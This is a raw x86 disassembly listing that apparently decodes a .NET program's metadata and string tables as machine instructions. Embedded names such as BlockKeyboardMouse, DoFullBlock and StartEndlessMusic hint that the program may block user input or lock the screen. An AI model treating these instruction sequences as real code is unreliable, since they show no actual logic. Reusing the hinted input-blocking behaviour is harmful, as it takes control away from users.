  404d12:	40                   	inc    %eax
  404d13:	00 91 00 53 0c 06    	add    %dl,0x60c5300(%ecx)
  404d19:	00 14 00             	add    %dl,(%eax,%eax,1)
  404d1c:	ce                   	into
  404d1d:	0e                   	push   %cs
  404d1e:	59                   	pop    %ecx
  404d1f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404d22:	cf                   	iret
  404d23:	0d 63 00 1c 00       	or     $0x1c0063,%eax
  404d28:	ce                   	into
  404d29:	0e                   	push   %cs
  404d2a:	59                   	pop    %ecx
  404d2b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404d2e:	cf                   	iret
  404d2f:	0d 63 00 24 00       	or     $0x240063,%eax
  404d34:	ce                   	into
  404d35:	0e                   	push   %cs
  404d36:	59                   	pop    %ecx
  404d37:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d3a:	cf                   	iret
  404d3b:	0d 63 00 14 00       	or     $0x140063,%eax
  404d40:	99                   	cltd
  404d41:	02 7b 00             	add    0x0(%ebx),%bh
  404d44:	1c 00                	sbb    $0x0,%al
  404d46:	99                   	cltd
  404d47:	02 7b 00             	add    0x0(%ebx),%bh
  404d4a:	24 00                	and    $0x0,%al
  404d4c:	99                   	cltd
  404d4d:	02 7b 00             	add    0x0(%ebx),%bh
  404d50:	91                   	xchg   %eax,%ecx
  404d51:	00 15 08 8d 00 99    	add    %dl,0x99008d08
  404d57:	01 a3 0e 97 00 a9    	add    %esp,-0x56ff68f2(%ebx)
  404d5d:	01 4e 0d             	add    %ecx,0xd(%esi)
  404d60:	a9 00 a9 01 da       	test   $0xda01a900,%eax
  404d65:	0e                   	push   %cs
  404d66:	ad                   	lods   %ds:(%esi),%eax
  404d67:	00 a9 01 b9 0a b2    	add    %ch,-0x4df546ff(%ecx)
  404d6d:	00 b1 01 12 0c c1    	add    %dh,-0x3ef3edff(%ecx)
  404d73:	00 b9 00 56 10 c5    	add    %bh,-0x3aefaa00(%ecx)
  404d79:	00 b9 00 49 10 c5    	add    %bh,-0x3aefb700(%ecx)
  404d7f:	00 b9 00 69 07 cb    	add    %bh,-0x34f89700(%ecx)
  404d85:	00 b9 01 ac 04 06    	add    %bh,0x604ac01(%ecx)
  404d8b:	00 c9                	add    %cl,%cl
  404d8d:	00 53 0c             	add    %dl,0xc(%ebx)
  404d90:	06                   	push   %es
  404d91:	00 a9 01 38 08 d1    	add    %ch,-0x2ef7c7ff(%ecx)
  404d97:	00 c1                	add    %al,%cl
  404d99:	01 d1                	add    %edx,%ecx
  404d9b:	03 d5                	add    %ebp,%edx
  404d9d:	00 c1                	add    %al,%cl
  404d9f:	00 53 0c             	add    %dl,0xc(%ebx)
  404da2:	06                   	push   %es
  404da3:	00 c1                	add    %al,%cl
  404da5:	00 f3                	add    %dh,%bl
  404da7:	04 da                	add    $0xda,%al
  404da9:	00 c1                	add    %al,%cl
  404dab:	00 67 0b             	add    %ah,0xb(%edi)
  404dae:	15 00 c1 00 97       	adc    $0x9700c100,%eax
  404db3:	10 e1                	adc    %ah,%cl
  404db5:	00 c1                	add    %al,%cl
  404db7:	00 83 03 e6 00 c1    	add    %al,-0x3eff19fd(%ebx)
  404dbd:	00 76 0f             	add    %dh,0xf(%esi)
  404dc0:	15 00 f1 00 11       	adc    $0x1100f100,%eax
  404dc5:	0b ed                	or     %ebp,%ebp
  404dc7:	00 b9 00 56 10 5b    	add    %bh,0x5b105600(%ecx)
  404dcd:	01 b1 01 2d 04 c1    	add    %esi,-0x3efbd2ff(%ecx)
  404dd3:	00 b9 00 60 07 62    	add    %bh,0x62076000(%ecx)
  404dd9:	01 99 01 f8 0d 68    	add    %ebx,0x680df801(%ecx)
  404ddf:	01 99 01 90 0e 6d    	add    %ebx,0x6d0e9001(%ecx)
  404de5:	01 e1                	add    %esp,%ecx
  404de7:	00 f2                	add    %dh,%dl
  404de9:	01 74 01 e1          	add    %esi,-0x1f(%ecx,%eax,1)
  404ded:	00 15 08 79 01 99    	add    %dl,0x99017908
  404df3:	01 90 0e 7e 01 b9    	add    %edx,-0x46fe81f2(%eax)
  404df9:	00 69 07             	add    %ch,0x7(%ecx)
  404dfc:	84 01                	test   %al,(%ecx)
  404dfe:	e9 01 6f 08 8d       	jmp    0x8d48bd04
  404e03:	01 c1                	add    %eax,%ecx
  404e05:	01 25 04 7e 01 d9    	add    %esp,0xd9017e04
  404e0b:	00 75 0e             	add    %dh,0xe(%ebp)
  404e0e:	94                   	xchg   %eax,%esp
  404e0f:	01 99 01 90 0e 99    	add    %ebx,-0x66f16fff(%ecx)
  404e15:	01 d9                	add    %ebx,%ecx
  404e17:	00 b7 0f 9f 01 d9    	add    %dh,-0x26fe60f1(%edi)
  404e1d:	00 ab 0f d5 00 f9    	add    %ch,-0x6ff2af1(%ebx)
  404e23:	01 75 0e             	add    %esi,0xe(%ebp)
  404e26:	94                   	xchg   %eax,%esp
  404e27:	01 d9                	add    %ebx,%ecx
  404e29:	00 7a 10             	add    %bh,0x10(%edx)
  404e2c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e2d:	01 e9                	add    %ebp,%ecx
  404e2f:	00 dd                	add    %bl,%ch
  404e31:	02 8d 00 d9 00 70    	add    0x7000d900(%ebp),%cl
  404e37:	0d b2 01 c1 01       	or     $0x1c101b2,%eax
  404e3c:	63 08                	arpl   %ecx,(%eax)
  404e3e:	d1 00                	roll   $1,(%eax)
  404e40:	d9 00                	flds   (%eax)
  404e42:	c5 0f                	lds    (%edi),%ecx
  404e44:	9f                   	lahf
  404e45:	01 09                	add    %ecx,(%ecx)
  404e47:	02 53 0c             	add    0xc(%ebx),%dl
  404e4a:	c6 01 11             	movb   $0x11,(%ecx)
  404e4d:	02 b9 0a cc 01 51    	add    0x5101cc0a(%ecx),%bh
  404e53:	01 53 0c             	add    %edx,0xc(%ebx)
  404e56:	c6 01 f1             	movb   $0xf1,(%ecx)
  404e59:	00 53 0c             	add    %dl,0xc(%ebx)
  404e5c:	e0 01                	loopne 0x404e5f
  404e5e:	f1                   	int1
  404e5f:	00 63 02             	add    %ah,0x2(%ebx)
  404e62:	15 00 f1 00 70       	adc    $0x7000f100,%eax
  404e67:	0f 06                	clts
  404e69:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  404e6d:	0c 06                	or     $0x6,%al
  404e6f:	00 44 00 cd          	add    %al,-0x33(%eax,%eax,1)
  404e73:	01 0e                	add    %ecx,(%esi)
  404e75:	02 f9                	add    %cl,%bh
  404e77:	01 94 0d 14 02 44 00 	add    %edx,0x440214(%ebp,%ecx,1)
  404e7e:	45                   	inc    %ebp
  404e7f:	0c 19                	or     $0x19,%al
  404e81:	02 4c 00 30          	add    0x30(%eax,%eax,1),%cl
  404e85:	0f 2a 02             	cvtpi2ps (%edx),%xmm0
  404e88:	c9                   	leave
  404e89:	00 91 0f 2f 02 4c    	add    %dl,0x4c022f0f(%ecx)
  404e8f:	00 8d 0f 35 02 99    	add    %cl,-0x66fdcaf1(%ebp)
  404e95:	01 a3 0e 39 02 19    	add    %esp,0x1902390e(%ebx)
  404e9b:	02 97 0e 3f 02 54    	add    0x54023f0e(%edi),%dl
  404ea1:	00 53 0c             	add    %dl,0xc(%ebx)
  404ea4:	c6 01 19             	movb   $0x19,(%ecx)
  404ea7:	02 b1 0e 59 02 19    	add    0x1902590e(%ecx),%dh
  404ead:	02 30                	add    (%eax),%dh
  404eaf:	10 79 02             	adc    %bh,0x2(%ecx)
  404eb2:	99                   	cltd
  404eb3:	01 53 0c             	add    %edx,0xc(%ebx)
  404eb6:	8b 02                	mov    (%edx),%eax
  404eb8:	09 01                	or     %eax,(%ecx)
  404eba:	09 04 a2             	or     %eax,(%edx,%eiz,4)
  404ebd:	02 09                	add    (%ecx),%cl
  404ebf:	01 49 09             	add    %ecx,0x9(%ecx)
  404ec2:	06                   	push   %es
  404ec3:	00 11                	add    %dl,(%ecx)
  404ec5:	01 53 0c             	add    %edx,0xc(%ebx)
  404ec8:	b4 02                	mov    $0x2,%ah
  404eca:	19 01                	sbb    %eax,(%ecx)
  404ecc:	d3 02                	roll   %cl,(%edx)
  404ece:	ba 02 39 02 b7       	mov    $0xb7023902,%edx
  404ed3:	08 c3                	or     %al,%bl
  404ed5:	02 19                	add    (%ecx),%bl
  404ed7:	01 79 0b             	add    %edi,0xb(%ecx)
  404eda:	c9                   	leave
  404edb:	02 41 02             	add    0x2(%ecx),%al
  404ede:	95                   	xchg   %eax,%ebp
  404edf:	07                   	pop    %es
  404ee0:	d0 02                	rolb   $1,(%edx)
  404ee2:	31 02                	xor    %eax,(%edx)
  404ee4:	78 07                	js     0x404eed
  404ee6:	d6                   	salc
  404ee7:	02 b9 00 c2 02 10    	add    0x1002c200(%ecx),%bh
  404eed:	00 51 02             	add    %dl,0x2(%ecx)
  404ef0:	2c 0c                	sub    $0xc,%al
  404ef2:	c9                   	leave
  404ef3:	02 c1                	add    %cl,%al
  404ef5:	00 21                	add    %ah,(%ecx)
  404ef7:	10 15 00 21 01 53    	adc    %dl,0x53012100
  404efd:	0c 06                	or     $0x6,%al
  404eff:	00 51 02             	add    %dl,0x2(%ecx)
  404f02:	a2 0f 10 00 39       	mov    %al,0x3900100f
  404f07:	02 d1                	add    %cl,%dl
  404f09:	01 c3                	add    %eax,%ebx
  404f0b:	02 51 02             	add    0x2(%ecx),%dl
  404f0e:	1e                   	push   %ds
  404f0f:	0c c9                	or     $0xc9,%al
  404f11:	02 59 02             	add    0x2(%ecx),%bl
  404f14:	53                   	push   %ebx
  404f15:	0c fc                	or     $0xfc,%al
  404f17:	02 51 02             	add    0x2(%ecx),%dl
  404f1a:	3c 0f                	cmp    $0xf,%al
  404f1c:	05 03 21 01 02       	add    $0x2012103,%eax
  404f21:	0a 0c 03             	or     (%ebx,%eax,1),%cl
  404f24:	51                   	push   %ecx
  404f25:	02 c1                	add    %cl,%al
  404f27:	08 13                	or     %dl,(%ebx)
  404f29:	03 51 02             	add    0x2(%ecx),%edx
  404f2c:	d6                   	salc
  404f2d:	0d 1a 03 79 02       	or     $0x279031a,%eax
  404f32:	cd 01                	int    $0x1
  404f34:	20 03                	and    %al,(%ebx)
  404f36:	c1 00 2d             	roll   $0x2d,(%eax)
  404f39:	08 27                	or     %ah,(%edi)
  404f3b:	03 e9                	add    %ecx,%ebp
  404f3d:	01 dd                	add    %ebx,%ebp
  404f3f:	03 d1                	add    %ecx,%edx
  404f41:	00 e9                	add    %ch,%cl
  404f43:	01 fc                	add    %edi,%esp
  404f45:	03 d1                	add    %ecx,%edx
  404f47:	00 e9                	add    %ch,%cl
  404f49:	01 15 0a 32 03 99    	add    %edx,0x9903320a
  404f4f:	01 a3 0e 38 03 29    	add    %esp,0x2903380e(%ebx)
  404f55:	01 53 0c             	add    %edx,0xc(%ebx)
  404f58:	06                   	push   %es
  404f59:	00 29                	add    %ch,(%ecx)
  404f5b:	01 f1                	add    %esi,%ecx
  404f5d:	07                   	pop    %es
  404f5e:	79 01                	jns    0x404f61
  404f60:	99                   	cltd
  404f61:	01 c4                	add    %eax,%esp
  404f63:	09 8d 00 91 02 f0    	or     %ecx,-0xffd6f00(%ebp)
  404f69:	09 53 03             	or     %edx,0x3(%ebx)
  404f6c:	91                   	xchg   %eax,%ecx
  404f6d:	02 7c 0c 59          	add    0x59(%esp,%ecx,1),%bh
  404f71:	03 31                	add    (%ecx),%esi
  404f73:	01 93 08 5f 03 31    	add    %edx,0x31035f08(%ebx)
  404f79:	01 c3                	add    %eax,%ebx
  404f7b:	0e                   	push   %cs
  404f7c:	5f                   	pop    %edi
  404f7d:	03 31                	add    (%ecx),%esi
  404f7f:	02 8c 07 63 03 19 01 	add    0x1190363(%edi,%eax,1),%cl
  404f86:	e1 09                	loope  0x404f91
  404f88:	69 03 41 02 9e 07    	imul   $0x79e0241,(%ebx),%eax
  404f8e:	d0 02                	rolb   $1,(%edx)
  404f90:	d9 00                	flds   (%eax)
  404f92:	13 05 74 03 5c 00    	adc    0x5c0374,%eax
  404f98:	53                   	push   %ebx
  404f99:	0c 8f                	or     $0x8f,%al
  404f9b:	03 39                	add    (%ecx),%edi
  404f9d:	01 db                	add    %ebx,%ebx
  404f9f:	0f af 03             	imul   (%ebx),%eax
  404fa2:	39 01                	cmp    %eax,(%ecx)
  404fa4:	ae                   	scas   %es:(%edi),%al
  404fa5:	0d b5 03 29 01       	or     $0x12903b5,%eax
  404faa:	42                   	inc    %edx
  404fab:	0e                   	push   %cs
  404fac:	b9 03 a9 02 9d       	mov    $0x9d02a903,%ecx
  404fb1:	09 bf 03 41 01 53    	or     %edi,0x53014103(%edi)
  404fb7:	0c 06                	or     $0x6,%al
  404fb9:	00 b9 02 42 01 c7    	add    %bh,-0x38febdfe(%ecx)
  404fbf:	03 b9 02 8b 0d cd    	add    -0x32f274fe(%ecx),%edi
  404fc5:	03 c1                	add    %ecx,%eax
  404fc7:	02 1a                	add    (%edx),%bl
  404fc9:	05 d3 03 99 01       	add    $0x19903d3,%eax
  404fce:	9d                   	popf
  404fcf:	08 5f 03             	or     %bl,0x3(%edi)
  404fd2:	d9 00                	flds   (%eax)
  404fd4:	7e 0d                	jle    0x404fe3
  404fd6:	db 03                	fildl  (%ebx)
  404fd8:	41                   	inc    %ecx
  404fd9:	01 30                	add    %esi,(%eax)
  404fdb:	10 e1                	adc    %ah,%cl
  404fdd:	03 29                	add    (%ecx),%ebp
  404fdf:	01 81 01 e6 03 49    	add    %eax,0x4903e601(%ecx)
  404fe5:	01 53 0c             	add    %edx,0xc(%ebx)
  404fe8:	06                   	push   %es
  404fe9:	00 49 01             	add    %cl,0x1(%ecx)
  404fec:	c4 03                	les    (%ebx),%eax
  404fee:	10 00                	adc    %al,(%eax)
  404ff0:	49                   	dec    %ecx
  404ff1:	01 67 0e             	add    %esp,0xe(%edi)
  404ff4:	10 00                	adc    %al,(%eax)
  404ff6:	49                   	dec    %ecx
  404ff7:	01 a1 03 f5 03 49    	add    %esp,0x4903f503(%ecx)
  404ffd:	01 f4                	add    %esi,%esp
  404fff:	0f 15 00             	unpckhps (%eax),%xmm0
  405002:	49                   	dec    %ecx
  405003:	01 4c 07 15          	add    %ecx,0x15(%edi,%eax,1)
  405007:	00 09                	add    %cl,(%ecx)
  405009:	01 70 0f             	add    %esi,0xf(%eax)
  40500c:	fc                   	cld
  40500d:	03 d1                	add    %ecx,%edx
  40500f:	02 0c 0b             	add    (%ebx,%ecx,1),%cl
  405012:	10 04 c9             	adc    %al,(%ecx,%ecx,8)
  405015:	00 91 0f 16 04 99    	add    %dl,-0x66fbe9f1(%ecx)
  40501b:	01 38                	add    %edi,(%eax)
  40501d:	0e                   	push   %cs
  40501e:	1b 04 d9             	sbb    (%ecx,%ebx,8),%eax
  405021:	02 3f                	add    (%edi),%bh
  405023:	03 2a                	add    (%edx),%ebp
  405025:	04 d9                	add    $0xd9,%al
  405027:	02 6d 10             	add    0x10(%ebp),%ch
  40502a:	33 04 69             	xor    (%ecx,%ebp,2),%eax
  40502d:	01 53 0c             	add    %edx,0xc(%ebx)
  405030:	39 04 89             	cmp    %eax,(%ecx,%ecx,4)
  405033:	01 53 0c             	add    %edx,0xc(%ebx)
  405036:	06                   	push   %es
  405037:	00 f1                	add    %dh,%cl
  405039:	02 d9                	add    %cl,%bl
  40503b:	01 4c 04 08          	add    %ecx,0x8(%esp,%eax,1)
  40503f:	00 10                	add    %dl,(%eax)
  405041:	00 6e 04             	add    %ch,0x4(%esi)
  405044:	09 00                	or     %eax,(%eax)
  405046:	14 00                	adc    $0x0,%al
  405048:	73 04                	jae    0x40504e
  40504a:	09 00                	or     %eax,(%eax)
  40504c:	18 00                	sbb    %al,(%eax)
  40504e:	78 04                	js     0x405054
  405050:	09 00                	or     %eax,(%eax)
  405052:	1c 00                	sbb    $0x0,%al
  405054:	7d 04                	jge    0x40505a
  405056:	0e                   	push   %cs
  405057:	00 20                	add    %ah,(%eax)
  405059:	00 82 04 0e 00 24    	add    %al,0x24000e04(%edx)
  40505f:	00 df                	add    %bl,%bh
  405061:	04 21                	add    $0x21,%al
  405063:	00 8b 00 71 06 2e    	add    %cl,0x2e067100(%ebx)
  405069:	00 0b                	add    %cl,(%ebx)
  40506b:	00 91 05 2e 00 13    	add    %dl,0x13002e05(%ecx)
  405071:	00 9a 05 2e 00 1b    	add    %bl,0x1b002e05(%edx)
  405077:	00 b9 05 2e 00 23    	add    %bh,0x23002e05(%ecx)
  40507d:	00 c2                	add    %al,%dl
  40507f:	05 2e 00 2b 00       	add    $0x2b002e,%eax
  405084:	d2 05 2e 00 33 00    	rolb   %cl,0x33002e
  40508a:	d2 05 2e 00 3b 00    	rolb   %cl,0x3b002e
  405090:	d2 05 2e 00 43 00    	rolb   %cl,0x43002e
  405096:	c2 05 2e             	ret    $0x2e05
  405099:	00 4b 00             	add    %cl,0x0(%ebx)
  40509c:	d8 05 2e 00 53 00    	fadds  0x53002e
  4050a2:	d2 05 2e 00 5b 00    	rolb   %cl,0x5b002e
  4050a8:	d2 05 2e 00 63 00    	rolb   %cl,0x63002e
  4050ae:	f0 05 2e 00 6b 00    	lock add $0x6b002e,%eax
  4050b4:	1a 06                	sbb    (%esi),%al
  4050b6:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4050ba:	27                   	daa
  4050bb:	06                   	push   %es
  4050bc:	41                   	inc    %ecx
  4050bd:	00 8b 00 71 06 43    	add    %cl,0x43067100(%ebx)
  4050c3:	00 7b 00             	add    %bh,0x0(%ebx)
  4050c6:	78 04                	js     0x4050cc
  4050c8:	43                   	inc    %ebx
  4050c9:	00 83 00 7a 06 61    	add    %al,0x61067a00(%ebx)
  4050cf:	00 8b 00 71 06 80    	add    %cl,-0x7ff98f00(%ebx)
  4050d5:	00 93 00 78 04 89    	add    %dl,-0x76fb8800(%ebx)
  4050db:	00 b3 00 75 07 a0    	add    %dh,-0x5ff88b00(%ebx)
  4050e1:	00 93 00 78 04 a3    	add    %dl,-0x5cfb8800(%ebx)
  4050e7:	00 a3 00 da 06 a3    	add    %ah,-0x5cf92600(%ebx)
  4050ed:	00 ab 00 78 04 a3    	add    %ch,-0x5cfb8800(%ebx)
  4050f3:	00 7b 00             	add    %bh,0x0(%ebx)
  4050f6:	78 04                	js     0x4050fc
  4050f8:	a9 00 b3 00 75       	test   $0x7500b300,%eax
  4050fd:	07                   	pop    %es
  4050fe:	c0 00 93             	rolb   $0x93,(%eax)
  405101:	00 78 04             	add    %bh,0x4(%eax)
  405104:	c3                   	ret
  405105:	00 7b 00             	add    %bh,0x0(%ebx)
  405108:	78 04                	js     0x40510e
  40510a:	c3                   	ret
  40510b:	00 a3 00 1b 07 e0    	add    %ah,-0x1ff8e500(%ebx)
  405111:	00 93 00 78 04 e3    	add    %dl,-0x1cfb8800(%ebx)
  405117:	00 7b 00             	add    %bh,0x0(%ebx)
  40511a:	78 04                	js     0x405120
  40511c:	40                   	inc    %eax
  40511d:	01 9b 00 78 04 a0    	add    %ebx,-0x5ffb8800(%ebx)
  405123:	06                   	push   %es
  405124:	7b 00                	jnp    0x405126
  405126:	78 04                	js     0x40512c
  405128:	c0 06 7b             	rolb   $0x7b,(%esi)
  40512b:	00 78 04             	add    %bh,0x4(%eax)
  40512e:	e0 06                	loopne 0x405136
  405130:	7b 00                	jnp    0x405132
  405132:	78 04                	js     0x405138
  405134:	44                   	inc    %esp
  405135:	00 81 00 a1 00 b8    	add    %al,-0x47ff5f00(%ecx)
  40513b:	00 f2                	add    %dh,%dl
  40513d:	00 ac 01 ba 01 be 01 	add    %ch,0x1be01ba(%ecx,%eax,1)
  405144:	d5 01                	aad    $0x1
  405146:	db 01                	fildl  (%ecx)
  405148:	e7 01                	out    %eax,$0x1
  40514a:	ed                   	in     (%dx),%eax
  40514b:	01 91 02 94 02 aa    	add    %edx,-0x55fd6bfe(%ecx)
  405151:	02 de                	add    %dh,%bl
  405153:	02 f4                	add    %ah,%dh
  405155:	02 2d 03 3f 03 46    	add    0x46033f03,%ch
  40515b:	03 79 03             	add    0x3(%ecx),%edi
  40515e:	99                   	cltd
  40515f:	03 ef                	add    %edi,%ebp
  405161:	03 05 04 0a 04 20    	add    0x20040a04,%eax
  405167:	04 41                	add    $0x41,%al
  405169:	04 47                	add    $0x47,%al
  40516b:	04 55                	add    $0x55,%al
  40516d:	04 02                	add    $0x2,%al
  40516f:	00 01                	add    %al,(%ecx)
  405171:	00 05 00 04 00 06    	add    %al,0x6000400
  405177:	00 06                	add    %al,(%esi)
  405179:	00 00                	add    %al,(%eax)
  40517b:	00 ea                	add    %ch,%dl
  40517d:	01 71 05             	add    %esi,0x5(%ecx)
  405180:	00 00                	add    %al,(%eax)
  405182:	d6                   	salc
  405183:	0f 76 05 00 00 b7 02 	pcmpeqd 0x2b70000,%mm0
  40518a:	7b 05                	jnp    0x405191
  40518c:	00 00                	add    %al,(%eax)
  40518e:	c7                   	(bad)
  40518f:	0b 80 05 00 00 8c    	or     -0x73fffffb(%eax),%eax
  405195:	04 86                	add    $0x86,%al
  405197:	05 00 00 f4 0e       	add    $0xef40000,%eax
  40519c:	8c 05 02 00 01 00    	mov    %es,0x10002
  4051a2:	03 00                	add    (%eax),%eax
  4051a4:	02 00                	add    (%eax),%al
  4051a6:	02 00                	add    (%eax),%al
  4051a8:	05 00 02 00 03       	add    $0x3000200,%eax
  4051ad:	00 07                	add    %al,(%edi)
  4051af:	00 02                	add    %al,(%edx)
  4051b1:	00 39                	add    %bh,(%ecx)
  4051b3:	00 09                	add    %cl,(%ecx)
  4051b5:	00 02                	add    %al,(%edx)
  4051b7:	00 3a                	add    %bh,(%edx)
  4051b9:	00 0b                	add    %cl,(%ebx)
  4051bb:	00 01                	add    %al,(%ecx)
  4051bd:	00 3b                	add    %bh,(%ebx)
  4051bf:	00 0b                	add    %cl,(%ebx)
  4051c1:	00 02                	add    %al,(%edx)
  4051c3:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4051c6:	0d 00 1b 09 28       	or     $0x28091b00,%eax
  4051cb:	09 2d 00 51 00 6b    	or     %ebp,0x6b005100
  4051d1:	00 73 00             	add    %dh,0x0(%ebx)
  4051d4:	8a 00                	mov    (%eax),%al
  4051d6:	91                   	xchg   %eax,%ecx
  4051d7:	00 94 00 08 02 23 02 	add    %dl,0x2230208(%eax,%eax,1)
  4051de:	51                   	push   %ecx
  4051df:	02 87 03 00 01 11    	add    0x11010003(%edi),%al
  4051e5:	00 e3                	add    %ah,%bl
  4051e7:	0f 01 00             	sgdtl  (%eax)
  4051ea:	00 01                	add    %al,(%ecx)
  4051ec:	13 00                	adc    (%eax),%eax
  4051ee:	07                   	pop    %es
  4051ef:	10 02                	adc    %al,(%edx)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	01 19                	add    %ebx,(%ecx)
  4051f5:	00 82 0f 02 00 00    	add    %al,0x20f(%edx)
  4051fb:	01 1b                	add    %ebx,(%ebx)
  4051fd:	00 3a                	add    %bh,(%edx)
  4051ff:	0c 02                	or     $0x2,%al
  405201:	00 00                	add    %al,(%eax)
  405203:	01 1d 00 2b 0e 02    	add    %ebx,0x20e2b00
  405209:	00 00                	add    %al,(%eax)
  40520b:	01 1f                	add    %ebx,(%edi)
  40520d:	00 d8                	add    %bl,%al
  40520f:	0a 02                	or     (%edx),%al
  405211:	00 00                	add    %al,(%eax)
  405213:	01 21                	add    %esp,(%ecx)
  405215:	00 05 0b 02 00 04    	add    %al,0x400020b
  40521b:	80 00 00             	addb   $0x0,(%eax)
  40521e:	01 00                	add    %eax,(%eax)
	...
  40522c:	40                   	inc    %eax
  40522d:	04 00                	add    $0x0,%al
  40522f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40523a:	00 00                	add    %al,(%eax)
  40523c:	5c                   	pop    %esp
  40523d:	04 8c                	add    $0x8c,%al
  40523f:	01 00                	add    %eax,(%eax)
  405241:	00 00                	add    %al,(%eax)
  405243:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40524e:	00 00                	add    %al,(%eax)
  405250:	5c                   	pop    %esp
  405251:	04 e3                	add    $0xe3,%al
  405253:	0d 00 00 00 00       	or     $0x0,%eax
  405258:	04 00                	add    $0x0,%al
	...
  405262:	00 00                	add    %al,(%eax)
  405264:	5c                   	pop    %esp
  405265:	04 bd                	add    $0xbd,%al
  405267:	09 00                	or     %eax,(%eax)
  405269:	00 00                	add    %al,(%eax)
  40526b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405276:	00 00                	add    %al,(%eax)
  405278:	65 04 1e             	gs add $0x1e,%al
  40527b:	08 00                	or     %al,(%eax)
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40528a:	00 00                	add    %al,(%eax)
  40528c:	5c                   	pop    %esp
  40528d:	04 4b                	add    $0x4b,%al
  40528f:	04 00                	add    $0x0,%al
  405291:	00 00                	add    %al,(%eax)
  405293:	00 00                	add    %al,(%eax)
  405295:	00 00                	add    %al,(%eax)
  405297:	00 01                	add    %al,(%ecx)
  405299:	00 00                	add    %al,(%eax)
  40529b:	00 e9                	add    %ch,%cl
  40529d:	0c 00                	or     $0x0,%al
  40529f:	00 07                	add    %al,(%edi)
  4052a1:	00 04 00             	add    %al,(%eax,%eax,1)
  4052a4:	00 00                	add    %al,(%eax)
  4052a6:	00 00                	add    %al,(%eax)
  4052a8:	04 00                	add    $0x0,%al
  4052aa:	34 0b                	xor    $0xb,%al
  4052ac:	01 00                	add    %eax,(%eax)
  4052ae:	00 00                	add    %al,(%eax)
  4052b0:	04 00                	add    $0x0,%al
  4052b2:	59                   	pop    %ecx
  4052b3:	0b 02                	or     (%edx),%eax
  4052b5:	00 00                	add    %al,(%eax)
  4052b7:	00 04 00             	add    %al,(%eax,%eax,1)
  4052ba:	45                   	inc    %ebp
  4052bb:	0b b7 00 4d 02 bb    	or     -0x44fdb300(%edi),%esi
  4052c1:	00 74 02 bd          	add    %dh,-0x43(%edx,%eax,1)
  4052c5:	00 87 02 00 00 00    	add    %al,0x2(%edi)
  4052cb:	00 00                	add    %al,(%eax)
  4052cd:	3c 44                	cmp    $0x44,%al
  4052cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d0:	46                   	inc    %esi
  4052d1:	75 6c                	jne    0x40533f
  4052d3:	6c                   	insb   (%dx),%es:(%edi)
  4052d4:	42                   	inc    %edx
  4052d5:	6c                   	insb   (%dx),%es:(%edi)
  4052d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d7:	63 6b 3e             	arpl   %ebp,0x3e(%ebx)
  4052da:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4052dd:	32 32                	xor    (%edx),%dh
  4052df:	5f                   	pop    %edi
  4052e0:	30 00                	xor    %al,(%eax)
  4052e2:	3c 3e                	cmp    $0x3e,%al
  4052e4:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4052e7:	32 35 5f 30 00 3c    	xor    0x3c00305f,%dh
  4052ed:	42                   	inc    %edx
  4052ee:	6c                   	insb   (%dx),%es:(%edi)
  4052ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4052f0:	63 6b 4b             	arpl   %ebp,0x4b(%ebx)
  4052f3:	65 79 62             	gs jns 0x405358
  4052f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4052f7:	61                   	popa
  4052f8:	72 64                	jb     0x40535e
  4052fa:	4d                   	dec    %ebp
  4052fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4052fc:	75 73                	jne    0x405371
  4052fe:	65 3e 62 5f 5f       	gs bound %ebx,%ds:0x5f(%edi)
  405303:	32 35 5f 30 00 3c    	xor    0x3c00305f,%dh
  405309:	53                   	push   %ebx
  40530a:	74 61                	je     0x40536d
  40530c:	72 74                	jb     0x405382
  40530e:	45                   	inc    %ebp
  40530f:	6e                   	outsb  %ds:(%esi),(%dx)
  405310:	64 6c                	fs insb (%dx),%es:(%edi)
  405312:	65 73 73             	gs jae 0x405388
  405315:	4d                   	dec    %ebp
  405316:	75 73                	jne    0x40538b
  405318:	69 63 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%ebx),%esp
  40531f:	36 5f                	ss pop %edi
  405321:	30 00                	xor    %al,(%eax)
  405323:	3c 47                	cmp    $0x47,%al
  405325:	65 6e                	outsb  %gs:(%esi),(%dx)
  405327:	65 72 61             	gs jb  0x40538b
  40532a:	74 65                	je     0x405391
  40532c:	52                   	push   %edx
  40532d:	61                   	popa
  40532e:	6e                   	outsb  %ds:(%esi),(%dx)
  40532f:	64 6f                	outsl  %fs:(%esi),(%dx)
  405331:	6d                   	insl   (%dx),%es:(%edi)
  405332:	53                   	push   %ebx
  405333:	74 72                	je     0x4053a7
  405335:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  40533c:	32 38                	xor    (%eax),%bh
  40533e:	5f                   	pop    %edi
  40533f:	30 00                	xor    %al,(%eax)
  405341:	49                   	dec    %ecx
  405342:	45                   	inc    %ebp
  405343:	6e                   	outsb  %ds:(%esi),(%dx)
  405344:	75 6d                	jne    0x4053b3
  405346:	65 72 61             	gs jb  0x4053aa
  405349:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40534d:	31 00                	xor    %eax,(%eax)
  40534f:	45                   	inc    %ebp
  405350:	71 75                	jno    0x4053c7
  405352:	61                   	popa
  405353:	6c                   	insb   (%dx),%es:(%edi)
  405354:	69 74 79 43 6f 6d 70 	imul   $0x61706d6f,0x43(%ecx,%edi,2),%esi
  40535b:	61 
  40535c:	72 65                	jb     0x4053c3
  40535e:	72 60                	jb     0x4053c0
  405360:	31 00                	xor    %eax,(%eax)
  405362:	4c                   	dec    %esp
